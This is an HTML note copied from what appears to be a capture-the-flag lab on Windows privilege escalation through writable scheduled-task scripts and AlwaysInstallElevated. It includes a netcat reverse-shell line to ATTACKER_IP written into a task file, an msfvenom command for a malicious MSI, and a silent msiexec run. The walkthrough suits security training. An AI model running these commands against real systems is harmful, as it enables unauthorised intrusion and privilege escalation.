<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Scheduled Tasks</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Scheduled Tasks</h1><br/><h2>Scheduled Tasks</h2><br />Looking into scheduled tasks on the target system, you may see a  scheduled task that either lost its binary or it&#39;s using a binary you  can modify.<br />Scheduled tasks can be listed from the command line using the <code>schtasks</code> command  without any options. To retrieve detailed information about any of the  services, you can use a command like the following one:<br />                        Command Prompt        <br />        <code>C:\&gt; schtasks /query /tn vulntask /fo list /v<br />Folder: \<br />HostName:                             THM-PC1<br />TaskName:                             \vulntask<br />Task To Run:                          C:\tasks\schtask.bat<br />Run As User:                          taskusr1</code><br />            <br /><br />You will get lots of information about the task, but what matters for  us is the &quot;Task to Run&quot; parameter which indicates what gets executed by  the scheduled task, and the &quot;Run As User&quot; parameter, which shows the  user that will be used to execute the task.<br />If our current user can modify or overwrite the &quot;Task to Run&quot;  executable, we can control what gets executed by the taskusr1 user,  resulting in a simple privilege escalation. To check the file  permissions on the executable, we use <code>icacls</code>:<br />                        Command Prompt        <br />        <code>C:\&gt; icacls c:\tasks\schtask.bat<br />c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)<br />                    BUILTIN\Administrators:(I)(F)<br />                    BUILTIN\Users:(I)(F)</code><br />            <br /><br />As can be seen in the result, the <strong>BUILTIN\Users</strong>  group has full access (F) over the task&#39;s binary. This means we can  modify the .bat file and insert any payload we like. For your  convenience, <code>nc64.exe</code> can be found on <code>C:\tools</code>. Let&#39;s change the bat file to spawn a reverse shell:<br />                        Command Prompt        <br />        <code>C:\&gt; echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</code><br />            <br /><br />We then start a listener on the attacker machine on the same port we indicated on our reverse shell:<br /><code>nc -lvp 4444</code>The next time the scheduled task runs, you should receive the reverse  shell with taskusr1 privileges. While you probably wouldn&#39;t be able to  start the task in a real scenario and would have to wait for the  scheduled task to trigger, we have provided your user with permissions  to start the task manually to save you some time. We can run the task  with the following command:<br />                        Command Prompt        <br />        <code>C:\&gt; schtasks /run /tn vulntask</code><br />            <br /><br />And you will receive the reverse shell with taskusr1 privileges as expected:<br />                         Kali Linux         <br />        <code>user@attackerpc$ nc -lvp 4444<br />Listening on 0.0.0.0 4444<br />Connection received on 10.10.175.90 50649<br />Microsoft Windows [Version 10.0.17763.1821]<br />(c) 2018 Microsoft Corporation. All rights reserved.<br /><br />C:\Windows\system32&gt;whoami<br />wprivesc1\taskusr1</code><br />            <br /><br />Go to taskusr1 desktop to retrieve a flag. Don&#39;t forget to input the flag at the end of this task.<br /><br /><br /><br /><h2>AlwaysInstallElevated</h2><br />Windows installer files (also known as .msi files) are used to  install applications on the system. They usually run with the privilege  level of the user that starts it. However, these can be configured to  run with higher privileges from any user account (even unprivileged  ones). This could potentially allow us to generate a malicious MSI file  that would run with admin privileges.<br /><strong>Note:</strong> The AlwaysInstallElevated method won&#39;t work on this room&#39;s machine and it&#39;s included as information only.<br />This method requires two registry values to be set. You can query these from the command line using the commands below.<br />                        Command Prompt        <br />        <code>C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br />C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code><br />            <br /><br />To be able to exploit this vulnerability, both should be set.  Otherwise, exploitation will not be possible. If these are set, you can  generate a malicious .msi file using <code>msfvenom</code>, as seen below:<br /><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</code>As this is a reverse shell, you should also run the Metasploit  Handler module configured accordingly. Once you have transferred the  file you have created, you can run the installer with the command below  and receive the reverse shell:<br />                        Command Prompt        <br />        <code>C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</code></div></body></html>